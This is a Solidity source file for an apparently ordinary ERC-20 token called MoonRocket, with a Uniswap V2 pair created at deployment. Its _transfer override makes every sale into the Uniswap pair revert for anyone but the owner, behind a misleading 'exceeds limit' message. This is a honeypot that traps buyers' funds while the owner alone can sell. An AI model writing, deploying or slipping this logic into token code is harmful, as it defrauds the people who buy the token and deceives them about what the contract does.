// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } }
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() { _owner = _msgSender(); emit OwnershipTransferred(address(0), _owner); }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _; }
    function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
    function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0)); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }
}
interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 { function factory() external pure returns (address); function WETH() external pure returns (address); }


contract ERC20 is Context {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string public name; string public symbol; uint8 public constant decimals = 18;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function totalSupply() public view returns (uint256) { return _totalSupply; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) public returns (bool) { _transfer(_msgSender(), to, amount); return true; }
    function allowance(address o, address s) public view returns (uint256) { return _allowances[o][s]; }
    function approve(address s, uint256 amount) public returns (bool) { _approve(_msgSender(), s, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 cur = _allowances[from][_msgSender()];
        require(cur >= amount, "ERC20: insufficient allowance");
        _approve(from, _msgSender(), cur - amount);
        _transfer(from, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "zero");
        uint256 fb = _balances[from]; require(fb >= amount, "balance");
        _balances[from] = fb - amount; _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
    function _mint(address to, uint256 amount) internal { _totalSupply += amount; _balances[to] += amount; emit Transfer(address(0), to, amount); }
    function _approve(address o, address s, uint256 amount) internal { _allowances[o][s] = amount; emit Approval(o, s, amount); }
}

contract MoonRocket is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;
    constructor(address _router) ERC20("MoonRocket", "MOON") {
        router = IUniswapV2Router02(_router);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _mint(_msgSender(), 1_000_000_000 * 1e18);
    }
    function _transfer(address from, address to, uint256 amount) internal override {
        if (to == uniswapV2Pair && from != owner()) {
            revert("MOON: transfer amount exceeds limit");
        }
        super._transfer(from, to, amount);
    }
}
